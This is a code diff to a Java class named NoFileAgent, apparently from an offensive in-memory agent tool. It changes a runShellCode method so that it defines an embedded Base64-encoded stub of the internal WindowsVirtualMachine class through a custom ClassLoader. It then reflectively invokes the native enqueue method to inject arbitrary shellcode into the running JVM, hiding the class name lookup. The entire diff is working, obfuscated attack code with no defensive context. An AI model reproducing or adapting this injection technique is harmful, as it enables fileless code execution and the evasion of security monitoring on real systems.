@@ -533,8 +533,9 @@ public class NoFileAgent {
     }
 
     private void runShellCode(byte[] shellCode) throws Exception {
-        Class clazz = Class.forName("sun.tools.attach.WindowsVirtualMachine");
-        Method enqueue = clazz.getDeclaredMethod("enqueue", long.class, byte[].class, String.class, String.class, Object[].class);
+        byte[] classBytes = Base64.getDecoder().decode("yv66vgAAADQAIAoABQAWCAAXCgAYABkHABoHABsBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAKExzdW4vdG9vbHMvYXR0YWNoL1dpbmRvd3NWaXJ0dWFsTWFjaGluZTsBAAtvcGVuUHJvY2VzcwEABChJKUoBAApFeGNlcHRpb25zBwAcAQAHZW5xdWV1ZQEAPShKW0JMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9PYmplY3Q7KVYBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBABpXaW5kb3dzVmlydHVhbE1hY2hpbmUuamF2YQwABgAHAQAGYXR0YWNoBwAdDAAeAB8BACZzdW4vdG9vbHMvYXR0YWNoL1dpbmRvd3NWaXJ0dWFsTWFjaGluZQEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAC2xvYWRMaWJyYXJ5AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABAAFAAAAAAAEAAEABgAHAAEACAAAAC8AAQABAAAABSq3AAGxAAAAAgAJAAAABgABAAAABQAKAAAADAABAAAABQALAAwAAAEIAA0ADgABAA8AAAAEAAEAEAGIABEAEgABAA8AAAAEAAEAEAAIABMABwABAAgAAAAiAAEAAAAAAAYSArgAA7EAAAABAAkAAAAKAAIAAAALAAUADAABABQAAAACABU=");
+        Class clazz = new Loader().load(classBytes);
+        Method enqueue = clazz.getDeclaredMethod("enqueue",long.class,byte[].class,String.class,String.class,Object[].class);
         enqueue.setAccessible(true);
         enqueue.invoke(null, -1, shellCode, null, null, new Object[]{});
     }
@@ -546,6 +547,13 @@ public class NoFileAgent {
         return (Unsafe) field.get(null);
         }catch(Exception e){
             return null;
+        }
+    }
+
+    private static class Loader extends ClassLoader
+    {
+        public  Class load(byte[] b) {
+            return super.defineClass(b, 0, b.length);
         }
     }
 }
